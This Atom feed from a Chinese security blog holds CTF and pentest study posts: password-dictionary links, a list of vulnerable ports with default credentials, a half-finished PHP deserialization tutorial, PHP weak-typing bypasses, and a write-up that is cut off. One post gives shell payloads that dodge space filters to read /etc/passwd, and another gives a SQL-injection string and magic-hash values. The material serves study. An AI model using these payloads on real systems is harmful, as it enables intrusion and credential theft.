<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>一次就好</title>
  
  <subtitle>一次就好</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://black0saturday.github.io/"/>
  <updated>2020-04-01T09:05:41.871Z</updated>
  <id>http://black0saturday.github.io/</id>
  
  <author>
    <name>布布f</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>常见密码字典</title>
    <link href="http://black0saturday.github.io/2020/04/01/%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8/"/>
    <id>http://black0saturday.github.io/2020/04/01/常见密码字典/</id>
    <published>2020-04-01T06:33:43.000Z</published>
    <updated>2020-04-01T09:05:41.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>收集一些常见密码字典<br><a id="more"></a></p><h3 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h3><ul><li><a href="https://pan.baidu.com/share/link?shareid=193969&amp;uk=1965926143" target="_blank" rel="noopener">https://pan.baidu.com/share/link?shareid=193969&amp;uk=1965926143</a></li><li><a href="https://pan.baidu.com/share/link?shareid=193972&amp;uk=1965926143" target="_blank" rel="noopener">https://pan.baidu.com/share/link?shareid=193972&amp;uk=1965926143</a></li><li><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a></li><li><a href="https://github.com/TheKingOfDuck/fuzzDicts" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/fuzzDicts</a></li><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/top_100.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/top_100.txt</a></li><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/top_1000.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/top_1000.txt</a></li><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/top_500.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/top_500.txt</a></li><li><a href="https://github.com/noootown/PasswordDictionary" target="_blank" rel="noopener">https://github.com/noootown/PasswordDictionary</a></li><li><a href="https://github.com/hxer/dictTree" target="_blank" rel="noopener">https://github.com/hxer/dictTree</a><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3></li><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/web-fuzz-dict.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/web-fuzz-dict.txt</a></li></ul><h3 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h3><ul><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/user-agents.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/user-agents.txt</a></li></ul><h3 id="File-Locations"><a href="#File-Locations" class="headerlink" title="File-Locations"></a>File-Locations</h3><ul><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/file-locations.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/file-locations.txt</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;收集一些常见密码字典&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="爆破" scheme="http://black0saturday.github.io/tags/%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>常见web危险端口介绍</title>
    <link href="http://black0saturday.github.io/2020/03/31/%E5%B8%B8%E8%A7%81web%E5%8D%B1%E9%99%A9%E7%AB%AF%E5%8F%A3%E4%BB%8B%E7%BB%8D/"/>
    <id>http://black0saturday.github.io/2020/03/31/常见web危险端口介绍/</id>
    <published>2020-03-31T08:43:53.000Z</published>
    <updated>2020-04-01T09:55:50.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="端口及对应的服务和漏洞"><a href="#端口及对应的服务和漏洞" class="headerlink" title="端口及对应的服务和漏洞"></a>端口及对应的服务和漏洞</h2><ul><li>20：FTP服务的数据传输端口</li><li>21：FTP服务的连接端口，可能存在  弱口令暴力破解</li></ul><a id="more"></a><ul><li>22：SSH服务端口，可能存在 弱口令暴力破解</li><li>23：Telnet端口，可能存在 弱口令暴力破解</li><li>25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应</li><li>43：whois服务端口</li><li>53：DNS服务端口(TCP/UDP 53)</li><li>67/68：DHCP服务端口</li><li>69：TFTP端口，可能存在弱口令</li><li>80：HTTP端口，常见web漏洞</li><li>88：Kerberos协议端口</li><li>110：POP3邮件服务端口，和SMTP的25端口对应</li><li>135：RPC服务</li><li>137/138： NMB服务</li><li>139：SMB/CIFS服务</li><li>143：IMAP协议端口</li><li>161/162: Snmp服务，public弱口令</li><li>389：LDAP目录访问协议，有可能存在注入、弱口令</li><li>443：HTTPS端口，心脏滴血等与SSL有关的漏洞</li><li>445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010</li><li>512/513/514：Linux Rexec服务端口，可能存在爆破</li><li>873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞</li><li>1080：socket端口，可能存在爆破</li><li>1099：RMI，可能存在 RMI反序列化漏洞</li><li>1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露</li><li>1433：SQL Server对外提供服务端口</li><li>1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口</li><li>1521：oracle数据库端口</li><li>2049：NFS服务端口，可能存在NFS配置不当</li><li>2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞</li><li>2375：Docker端口，可能存在 Docker未授权访问漏洞</li><li>2601:   Zebra ，默认密码zebr</li><li>3128:   squid ，匿名访问（可能内网漫游)</li><li>3268：LDAP目录访问协议，有可能存在注入、弱口令</li><li>3306：MySQL数据库端口，可能存在 弱口令暴力破解</li><li>3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 - CVE-2019-0708 远程桌面漏洞复现</li><li>3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞</li><li>4440：Rundeck，弱口令admin</li><li>4560：log4j SocketServer监听的端口，可能存在 log4j&lt;=1.2.17反序列化漏洞（CVE-2019-17571）</li><li>4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)</li><li>4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin</li><li>5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞</li><li>5432：PostGreSQL数据库的端口</li><li>5632：PyAnywhere服务端口，可能存在代码执行漏洞</li><li>5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞</li><li>5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞</li><li>6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞</li><li>7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞</li><li>7180：Cloudera manager端口</li><li>8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞</li><li>8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell</li><li>8080-8090：可能存在web服务</li><li>8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞</li><li>8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）</li><li>9000：fastcgi端口，可能存在远程命令执行漏洞</li><li>9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)</li><li>9043/9090：WebSphere，可能存在WebSphere反序列化漏洞</li><li>9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞</li><li>10000：Webmin-Web控制面板，可能存在弱口令</li><li>10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)</li><li>11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞</li><li>27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞</li><li>50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。</li><li>50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞</li><li>61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现</li><li>60020：hbase.regionserver.port，HRegionServer的RPC端口</li><li>60030：hbase.regionserver.info.port，HRegionServer的http端口</li></ul><hr><h2 id="端口相关的命令（Windows）"><a href="#端口相关的命令（Windows）" class="headerlink" title="端口相关的命令（Windows）"></a>端口相关的命令（Windows）</h2><ul><li>netstat -a  显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED ），也包括监听连接请求（LISTENING ）的那些连接，<br>断开连接（CLOSE_WAIT ）或者处于联机等待状态的（TIME_WAIT ）等</li><li>netstat -n  以数字形式显示地址和端口号,显示所有已建立的有效连接</li><li>netstat -ano  列出所有端口的情况</li><li>netstat -ano|findstr “80”  查看被占用端口80对应的应用的PID</li><li>tasklist|findstr “80”  查看80端口被哪个进程或程序占用</li><li>结束该进程或程序：taskkill /f /t /im  XX.exe  结束该进程或程序</li></ul><hr><h2 id="Nmap中常见的服务"><a href="#Nmap中常见的服务" class="headerlink" title="Nmap中常见的服务"></a>Nmap中常见的服务</h2><ol><li>msmq?：默认对应的是1801端口，是MSMQ Microsoft Message Queuing（微软消息队列）的简称，是windows系统提供的一个功能，开启了该功能，则默认1801端口打开。该服务暂未发现漏洞。 </li><li>msrpc：Microsoft Remote Procedure Call（微软远程过程调用）是 Windows 操作系统使用的一个协议。该服务开启时对应端口2103、2105、2107开启。RPC 提供一种内部进程通讯机制，允许在一台电脑上运行的程序无缝的执行远程系统中的代码。</li><li>tcpwrapped：端口状态后经常标记tcpwrapped。tcpwrapped表示服务器运行 tcp_wrappers服务。该服务对应端口10050。tcp_wrappers是一种应用级防火墙。它可以根据预设，对SSH、Telnet、FTP服务的请求进行拦截，判断是否符合预设要求。如果符合，就会转发给对应的服务进程；否则，会中断连接请求。这说明tcp三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为tcpwrapped时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。</li><li>Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)：这是SQL Server中的SQL Reporting Service 服务使用的Microsoft HTTPAPI。该服务对应端口5985。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;端口及对应的服务和漏洞&quot;&gt;&lt;a href=&quot;#端口及对应的服务和漏洞&quot; class=&quot;headerlink&quot; title=&quot;端口及对应的服务和漏洞&quot;&gt;&lt;/a&gt;端口及对应的服务和漏洞&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;20：FTP服务的数据传输端口&lt;/li&gt;
&lt;li&gt;21：FTP服务的连接端口，可能存在  弱口令暴力破解&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://black0saturday.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>命令执行绕过空格的姿势</title>
    <link href="http://black0saturday.github.io/2020/03/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E7%9A%84%E5%A7%BF%E5%8A%BF/"/>
    <id>http://black0saturday.github.io/2020/03/27/命令执行绕过空格的姿势/</id>
    <published>2020-03-27T02:42:32.000Z</published>
    <updated>2020-04-02T04:05:54.691Z</updated>
    
    <content type="html"><![CDATA[<p>在一些漏洞利用场景（如命令执行，SQL注入），或者因为waf等原因，导致无法使用空格时，可以试试如下命令：<br><a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IFS&#x3D;,;&#96;cat&lt;&lt;&lt;cat,&#x2F;etc&#x2F;passwd&#96;</span><br><span class="line">cat$IFS&#x2F;etc&#x2F;passwd</span><br><span class="line">cat$&#123;IFS&#125;&#x2F;etc&#x2F;passwd</span><br><span class="line">cat&lt;&#x2F;etc&#x2F;passwd</span><br><span class="line">&#123;cat,&#x2F;etc&#x2F;passwd&#125;</span><br><span class="line">X&#x3D;$&#39;cat\x20&#x2F;etc&#x2F;passwd&#39;&amp;&amp;$X</span><br></pre></td></tr></table></figure><p>经过测试，除最后一条在mac osx下执行失败，这些命令在ubuntu 19.10和centos7下均执行成功。在mac osx系统下系统会将cat\x20/etc/passwd当成一个可执行文件，会提示No such file or directory。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在一些漏洞利用场景（如命令执行，SQL注入），或者因为waf等原因，导致无法使用空格时，可以试试如下命令：&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="http://black0saturday.github.io/2020/03/23/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://black0saturday.github.io/2020/03/23/PHP反序列化/</id>
    <published>2020-03-23T02:46:46.000Z</published>
    <updated>2020-04-01T09:06:26.513Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 考研用了一年，好久没写博客了，安全也很久没搞了，最近重新学了一遍以前自己的笔记，今天学到PHP序列化和反序列化，之前对这个概念就模模糊糊的，今天正好弄清楚。</p><a id="more"></a><h3 id="0x00：PHP序列化"><a href="#0x00：PHP序列化" class="headerlink" title="0x00：PHP序列化"></a>0x00：PHP序列化</h3><h4 id="序列化函数：serialize"><a href="#序列化函数：serialize" class="headerlink" title="序列化函数：serialize()"></a>序列化函数：serialize()</h4><p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p><p><strong>变量所储存的数据是内存数据，在程序执行结束时，内存数据便会立即销毁；而文件、数据库是“持久存储”，因此PHP序列化就是将内存的数据保存到文件中的过程。</strong></p><ol><li>$s = serialize($变量); //该函数将变量数据进行序列化转换为字符串</li><li>file_put_contents(‘./目标文本文件’, $s); //将$s保存到指定文件</li></ol><h4 id="For-example"><a href="#For-example" class="headerlink" title="For example"></a>For example</h4><pre><code>&lt;?phpclass User{    // 创建类数据    public $age = 0;    public $name = &apos;&apos;;    // 输出数据    public function PrintData()    {        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; .$this-&gt;age . &apos; years old.&apos;;        echo &quot;\n&quot;;    }}// 创建一个对象$usr = new User();// 设置数据$usr-&gt;age = 20;$usr-&gt;name = &apos;lemon&apos;;// 输出数据$usr-&gt;PrintData();// 输出序列化之后的数据echo serialize($usr);echo &quot;\n&quot;;?&gt;</code></pre><p>输出序列化后的结果</p><ol><li>User lemon is 20 years old. </li><li>O:4:”User”:2:{s:3:”age”;i:20;s:4:”name”;s:5:”lemon”;}</li></ol><p>可以看到序列化一个对象后会保存对象的所有变量，并且发现序列化后的结果都有一个字符，这些字符都是一下字母的缩写。</p><ul><li>a array                 </li><li>b boolean  </li><li>d double               </li><li>i integer</li><li>o common object </li><li>r reference</li><li>s string </li><li>C custom object</li><li>O class</li><li>N null</li><li>R pointer reference </li><li>U unicode string</li></ul><p>了解了缩写字母的含义，就可以解读序列化后的含义</p><ol><li>O:4:”User”:2:{s:3:”age”;i:20;s:4:”name”;s:5:”lemon”;}</li><li>对象类型:长度:”类名”:类中变量的个数:{类型:长度:”值”;类型:长度:”值”;……}</li></ol><p>通过这个例子，应该能理解序列化函数serialize()的功能</p><h3 id="0x01：PHP反序列化"><a href="#0x01：PHP反序列化" class="headerlink" title="0x01：PHP反序列化"></a>0x01：PHP反序列化</h3><p>函数：unserialize()</p><blockquote><p>unserialize()对单一的已序列化的变量进行操作，将其转回PHP的值。在解序列化一个对象前，这个对象的类必须在解序列化之前定义。</p></blockquote><p>简单理解起来就是<strong>将序列化过存储到文件中的数据，恢复到程序代码的变量表示形式的过程</strong>，恢复到变量序列化之前的结果。</p><pre><code>$s = file_get_contents(‘./目标文本文件’); //取得文本文件的内容（之前序列化过的字符串）$变量 = unserialize($s); //将该文本内容，反序列化到指定的变量中</code></pre><h4 id="For-example-1"><a href="#For-example-1" class="headerlink" title="For example"></a>For example</h4><pre><code>&lt;?php    // 某类    class User    {        // Class data        public $age = 0;        public $name = &apos;&apos;;        // Print data        public function PrintData()        {            echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old.&apos;;            echo &quot;\n&quot;;        }    }    // 重建对象    $usr = unserialize(&apos;O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:5:&quot;lemon&quot;;}&apos;);    // 调出PrintData输出数据    $usr-&gt;PrintData();?&gt;</code></pre><p>输出结果：</p><blockquote><p>User lemon is 20 years old.</p></blockquote><p><strong>注意：在解序列化一个对象前，这个对象的类必须在解序列化之前定义。否则会报错</strong></p><p>在先知上看大师傅举得例子对序列化和反序列化的介绍，也很好理解。</p><pre><code>&lt;?phpclass A{    var $test = &quot;demo&quot;;}$a = new A(); //生成a对象$b = serialize($a); //序列化a对象为b$c = unserialize($b); //反序列化b对象为cprint_r($b); //输出序列化之后的值echo &quot;\n&quot;;print_r($c-&gt;test); //输出对象c中test的值：demo?&gt;</code></pre><h3 id="0x02：PHP反序列化漏洞"><a href="#0x02：PHP反序列化漏洞" class="headerlink" title="0x02：PHP反序列化漏洞"></a>0x02：PHP反序列化漏洞</h3><p>在学习漏洞前，先来了解一下PHP魔法函数，对接下来的学习会很有帮助</p><blockquote><p>PHP将所有以__(两个下划线)开头的类方法保留为魔术方法</p></blockquote><ol><li>__construct   当一个对象创建时被调用，</li><li>__destruct   当一个对象销毁时被调用，</li><li>__toString   当一个对象被当作一个字符串被调用。</li><li>__wakeup()   使用unserialize时触发</li><li>__sleep()    使用serialize时触发</li><li>__destruct()    对象被销毁时触发</li><li>__call()    在对象上下文中调用不可访问的方法时触发</li><li>__callStatic()    在静态上下文中调用不可访问的方法时触发</li><li>__get()    用于从不可访问的属性读取数据</li><li>__set()    用于将数据写入不可访问的属性</li><li>__isset()    在不可访问的属性上调用isset()或empty()触发</li><li>__unset()     在不可访问的属性上使用unset()时触发</li><li>__toString()    把类当作字符串使用时触发,返回值需要为字符串</li><li>__invoke()   当脚本尝试将对象调用为函数时触发</li></ol><p>这里只列出了一部分的魔法函数，具体可见<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.magic.php</a></p><p>下面通过一个例子来简单了解一下魔法函数被自动调用的过程</p><pre><code>&lt;?phpclass test{ public $varr1=&quot;abc&quot;; public $varr2=&quot;123&quot;; public function echoP(){  echo $this-&gt;varr1.&quot;&lt;br&gt;&quot;; } public function __construct(){  echo &quot;__construct&lt;br&gt;&quot;; } public function __destruct(){  echo &quot;__destruct&lt;br&gt;&quot;; } public function __toString(){  return &quot;__toString&lt;br&gt;&quot;; } public function __sleep(){  echo &quot;__sleep&lt;br&gt;&quot;;  return array(&apos;varr1&apos;,&apos;varr2&apos;); } public function __wakeup(){  echo &quot;__wakeup&lt;br&gt;&quot;; }}$obj = new test();  //实例化对象，调用__construct()方法，输出__construct$obj-&gt;echoP();   //调用echoP()方法，输出&quot;abc&quot;echo $obj;//obj对象被当做字符串输出，调用__toString()方法，输出__toString$s =serialize($obj);  //obj对象被序列化，调用__sleep()方法，输出__sleepecho unserialize($s);  //$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。// 脚本结束又会调用__destruct()方法，输出__destruct?&gt;</code></pre><h2 id="未完待续！！"><a href="#未完待续！！" class="headerlink" title="未完待续！！"></a>未完待续！！</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt; 考研用了一年，好久没写博客了，安全也很久没搞了，最近重新学了一遍以前自己的笔记，今天学到PHP序列化和反序列化，之前对这个概念就模模糊糊的，今天正好弄清楚。&lt;/p&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://black0saturday.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>PHP特性总结</title>
    <link href="http://black0saturday.github.io/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/"/>
    <id>http://black0saturday.github.io/2018/11/15/PHP特性总结/</id>
    <published>2018-11-15T08:52:43.000Z</published>
    <updated>2019-12-30T10:31:51.359Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>打CTF经常会遇到代码审计的题目，一般接触到的都是php型的，做的笔记到处都是，这里就准备把它们全总结到一起。<br><a id="more"></a></p><h2 id="一、数组"><a href="#一、数组" class="headerlink" title="一、数组"></a>一、数组</h2><h3 id="0x01-数组的md5"><a href="#0x01-数组的md5" class="headerlink" title="0x01 数组的md5"></a>0x01 数组的md5</h3><p>这个大家应该都知道，md5算法对数组加密结果是NULL。比如下面这段代码：<br><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/1.png" alt><br>首先判断username和password是否一致，一致的话提示’Your password can not be your username.’。<br>这里就用到了php的一个特性</p><blockquote><p>php对数组进行md5加密返回的结果都是null</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo md5($_GET[&#39;username&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行一下<br><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/2.png" alt><br>爆出警告需要一个字符类型的参数，而不是数组</p><p>然后我们测试一下上面那个题，输入<code>username</code>和<code>password</code>都为数组，但是赋值不同<br><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/3.png" alt><br>由于两个的赋值不同，所以通过第一个判断，又由于都是数组，php对其进行md5加密后都返回为NULL,所以通过了第二个判断，输出flag。</p><h3 id="0x02-strcmp-函数"><a href="#0x02-strcmp-函数" class="headerlink" title="0x02 strcmp()函数"></a>0x02 strcmp()函数</h3><p>先看这个代码<br><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/4.png" alt><br>这里使用strcmp去比较password和flag,如果==0，就给出flag。<br>strcmp比较时，如果相等才会返回0，如果不相等返回要么大于0，要么小于0，这里记住一句话：</p><blockquote><p>strcmp函数只会处理字符串参数，如果给个数组，就会返回NULL，而判断使用的是==，<code>NULL==0</code>,这个等式的逻辑值是true。</p></blockquote><p>利用这个漏洞，我们来做这个题</p><p><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/5.png" alt></p><h2 id="二、数字的比较"><a href="#二、数字的比较" class="headerlink" title="二、数字的比较"></a>二、数字的比较</h2><h3 id="0x01-十六进制与数字"><a href="#0x01-十六进制与数字" class="headerlink" title="0x01 十六进制与数字"></a>0x01 十六进制与数字</h3><p>还是先看题吧<br><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/8.png" alt><br>代码的意思就是： 不让输入1到9的数字，但是后面却让比较一串数字，这里想到的就是用进制转换，然后再比较。<br>那么将<code>3735929054</code>这串数字转换成十六进制是<code>deadc0de</code>,然后两个进行比较，比较结果当然是相等的，这样就能成功绕过，得到flag<br><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/7.png" alt></p><h3 id="0x02-数字运算-一"><a href="#0x02-数字运算-一" class="headerlink" title="0x02 数字运算(一)"></a>0x02 数字运算(一)</h3><p><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/9.png" alt></p><p>大致意思就是：POST传入password的值，必须大于12位，必须是非空非TAB，然后password要有大小写数字，字符，陪陪次数要大于6，最后要<code>$password==42</code>.</p><p>这里直接给出现成的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;42.00e+00000000000</span><br><span class="line">或者</span><br><span class="line">password&#x3D;420.000000000e-1</span><br></pre></td></tr></table></figure></p><h3 id="0x03-数字运算-二"><a href="#0x03-数字运算-二" class="headerlink" title="0x03 数字运算(二)"></a>0x03 数字运算(二)</h3><p><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/10.png" alt><br>代码中先将变量放到is_numberic函数中判断，如果是数字或数字字符串则返回true，否则返回false。然后一个判断，如果temp大于1336则显示flag。这里用到了PHP弱类型的一个特性，</p><blockquote><p>当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。</p></blockquote><p>那么输入一个1337a这样的字符串，在is_numeric中返回true，然后在比较时被转换成数字1337，这样就绕过判断输出flag。</p><h3 id="0x04-MD5的巧合-一"><a href="#0x04-MD5的巧合-一" class="headerlink" title="0x04 MD5的巧合(一)"></a>0x04 MD5的巧合(一)</h3><p><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/11.png" alt><br>输入password，要求其MD5值为0</p><blockquote><p>有一些特定的字符被MD5加密后结果是0e开头的</p></blockquote><p>而URL中0e被当作了科学计数法，0*10的多少次方都是0<br>这样的字符串其实有很多，这里给出几个：</p><blockquote><p>240610708<br>QNKCDZO</p></blockquote><h3 id="0x03-MD5的巧合-二"><a href="#0x03-MD5的巧合-二" class="headerlink" title="0x03 MD5的巧合(二)"></a>0x03 MD5的巧合(二)</h3><p><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/12.png" alt><br>其中md5运算函数有一个true参数，它的作用是将md5后的hex转换成字符串，这里如果字符串有单引号之类的字符就可以注入了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">比如字符串：ffifdyop</span><br><span class="line">md5后，276f722736c95d99e921722cf9ed621c</span><br></pre></td></tr></table></figure><br>将其转成字符串的话就是<br><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/13.png" alt><br>可以看到起字符串类似于 <code>&#39;or&#39;6………..</code>这样的字符串，其中<code>&#39;or&#39;6</code>是个永真的条件，如果把它放到查询中就可以where语句的判断，比如我们在url输入<code>password=ffifdyop</code>可以看到dump出的数据<br><img src="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/14.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;PHP特性&quot;&gt;&lt;a href=&quot;#PHP特性&quot; class=&quot;headerlink&quot; title=&quot;PHP特性&quot;&gt;&lt;/a&gt;PHP特性&lt;/h1&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;打CTF经常会遇到代码审计的题目，一般接触到的都是php型的，做的笔记到处都是，这里就准备把它们全总结到一起。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://black0saturday.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>2018WEB安全测试秋季预选赛</title>
    <link href="http://black0saturday.github.io/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/"/>
    <id>http://black0saturday.github.io/2018/10/28/2018WEB安全测试秋季预选赛/</id>
    <published>2018-10-28T13:31:43.000Z</published>
    <updated>2019-12-30T10:31:51.372Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-Input"><a href="#1-Input" class="headerlink" title="1. Input"></a>1. Input</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8003/" target="_blank" rel="noopener">http://114.55.36.69:8003/</a><br>进去后一个输入框，一个提交<br><a id="more"></a><br>但是这个按钮好像是无效的 点了也没有提交我们输入的内容</p></blockquote><p><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/1.png" alt><br>然后查看源代码，发现有一段JavaScript代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 